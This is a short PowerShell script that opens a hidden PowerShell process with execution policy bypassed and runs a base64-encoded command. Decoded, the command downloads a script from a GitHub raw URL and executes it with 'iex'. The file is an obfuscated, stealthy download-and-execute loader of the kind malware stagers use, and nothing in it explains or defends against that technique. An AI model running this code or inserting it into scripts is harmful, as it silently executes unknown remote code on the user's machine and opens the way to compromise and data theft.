$process = New-Object System.Diagnostics.Process
$process.StartInfo.FileName = "powershell.exe"
$process.StartInfo.Arguments = '-executionpolicy bypass -EncodedCommand aQByAG0AIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGEAZABmADQAZgAzAC8AYwAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AYQAuAHAAcwAxACAAfAAgAGkAZQB4AA=='
$process.StartInfo.UseShellExecute = $false
$process.StartInfo.CreateNoWindow = $true
$process.Start() | Out-Null
